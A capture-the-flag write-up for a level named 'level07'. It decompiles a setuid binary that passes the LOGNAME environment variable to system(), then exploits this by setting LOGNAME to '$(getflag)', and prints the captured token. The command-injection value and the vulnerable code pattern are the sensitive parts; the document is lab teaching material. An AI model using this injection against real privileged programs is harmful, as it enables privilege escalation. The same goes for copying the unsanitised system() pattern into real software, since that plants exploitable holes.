## Step 1: Identifying the User

We begin by checking our current user informations:

```bash
$ id
uid=2007(level07) gid=2007(level07) groups=2007(level07),100(users)
```

This shows that we are operating as the user `level07`.

---
## Step 2: Searching for Files

```bash
$ ls -la
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07


$ file level07
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped

$ ./level07
level07
```
The level06 binary is a setuid ELF executable, meaning it executes with the flag07 user's permissions.

Let's transfer it to our local machine for reverse engineering:
```bash
$ scp -P 4242 level03@machine_ip:/home/level07/level07 .
```
---
## Step 3: Reverse Engineering the Binary with Ghidra

The C pseudo code generated by Ghidra is as follows:
```c
void main(void)

{
  char *pcVar1;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  system(local_1c);
  return;
}
```
### Explanation:
The vulnerability lies in the fact that the program uses the system() function to execute a command containing user-controlled input (the `LOGNAME` environment variable) without proper sanitization. This allows an attacker to inject arbitrary commands by manipulating the `LOGNAME` environment variable.

---
## Step 4: Exploiting the Binary to Get a flag
To exploit this, we can change environement variable, to change `LOGNAME` by `$(getflag)`

```bash
export LOGNAME=\$\(getflag\)
```

```bash
$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
---

And there you have it, the token is `fiumuikeil55xe9cu4dood66h`.
